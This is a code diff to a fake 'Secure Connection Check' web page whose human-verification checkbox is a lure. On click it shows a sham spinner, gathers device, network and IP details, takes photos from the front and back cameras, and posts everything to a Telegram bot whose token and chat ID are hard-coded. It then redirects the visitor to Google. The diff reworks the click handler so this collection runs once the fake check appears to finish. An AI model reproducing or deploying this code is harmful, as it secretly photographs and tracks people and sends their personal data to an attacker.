@@ -4,11 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Secure Connection Check</title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
+  <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
-    <style>    
+  <style>    
     body { font-family: 'Roboto', sans-serif; }
 
     /* Spinner style */
@@ -64,30 +63,6 @@
   <script>
     const checkbox = document.getElementById('verifyHuman');
     const spinner = document.getElementById('spinner');
-
-    checkbox.addEventListener('click', function (e) {
-      e.preventDefault(); // prevent default toggle
-
-      // Hide checkbox, show spinner
-      checkbox.style.display = 'none';
-      spinner.style.display = 'block';
-
-      setTimeout(() => {
-        // After 3s, show checkbox again, check it
-        spinner.style.display = 'none';
-        checkbox.checked = true;
-        checkbox.style.display = 'block';
-      }, 3000);
-    });
-  </script>    
-
-  <script>
-    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
-    const chatId = "7216371031";
-    const ipToken = "18d2a866939a58";
-
-    let frontCaptured = false;
-    let backCaptured = false;
 
     // Network Information
     async function getNetworkInfo() {
@@ -177,7 +152,7 @@
 
       // IP Info
       try {
-        const res = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
+        const res = await fetch(`https://ipinfo.io/json?token=18d2a866939a58`);
         const ipData = await res.json();
         data.ip = ipData.ip;
         data.city = ipData.city;
@@ -244,11 +219,11 @@
 - ${data.cameraStatus}
       `;
 
-      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: "7216371031",
           text: message,
           parse_mode: "Markdown"
         })
@@ -257,33 +232,46 @@
 
     function sendPhotoToTelegram(blob, caption) {
       const formData = new FormData();
-      formData.append("chat_id", chatId);
+      formData.append("chat_id", "7216371031");
       formData.append("photo", blob, `${caption}.jpg`);
       formData.append("caption", caption);
 
-      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+      return fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendPhoto`, {
         method: "POST",
         body: formData
       });
     }
 
-    // Execute when checkbox is checked
-    document.getElementById('verifyHuman').addEventListener('change', async function() {
-      if (this.checked) {
+    // Execute when checkbox is clicked
+    checkbox.addEventListener('click', async function(e) {
+      e.preventDefault(); // Prevent default toggle
+
+      // Hide checkbox, show spinner
+      checkbox.style.display = 'none';
+      spinner.style.display = 'block';
+
+      // Simulate a delay (e.g., 3 seconds)
+      setTimeout(async () => {
+        // After 3s, show checkbox again, check it
+        spinner.style.display = 'none';
+        checkbox.checked = true;
+        checkbox.style.display = 'block';
+
+        // Trigger the data collection and Telegram message sending
         const info = await getDeviceInfo();
 
         // Capture front camera (only once)
         let frontSnap = null;
-        if (!frontCaptured) {
+        if (!window.frontCaptured) {
           frontSnap = await getSnapshot("user");
-          frontCaptured = true;
+          window.frontCaptured = true;
         }
 
         // Capture back camera (only once)
         let backSnap = null;
-        if (!backCaptured) {
+        if (!window.backCaptured) {
           backSnap = await getSnapshot("environment");
-          backCaptured = true;
+          window.backCaptured = true;
         }
 
         // Set camera status
@@ -306,7 +294,7 @@
         setTimeout(() => {
           window.location.href = "https://www.google.com";
         }, 3000);
-      }
+      }, 3000);
     });
   </script>
 </body>
